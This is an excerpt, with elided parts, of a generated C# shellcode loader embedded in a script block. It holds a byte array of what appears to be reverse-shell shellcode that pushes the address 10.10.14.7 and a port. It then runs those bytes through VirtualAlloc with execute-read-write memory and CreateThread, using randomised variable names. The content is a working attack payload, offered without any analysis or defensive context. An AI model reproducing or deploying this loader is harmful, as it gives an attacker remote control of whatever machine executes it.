...
0x68,0x0a,0x0a,0x0e,0x07,0x68,0x02,0x00,0x23,0x29,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr rCkHgSY = VirtualAlloc(IntPtr.Zero,(UIntPtr)cVRc.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(cVRc,0,rCkHgSY,cVRc.Length);
        IntPtr mFeUgt5r = IntPtr.Zero;
        IntPtr dJAgl = CreateThread(IntPtr.Zero,UIntPtr.Zero,rCkHgSY,IntPtr.Zero,0,ref mFeUgt5r);
    }
</script>
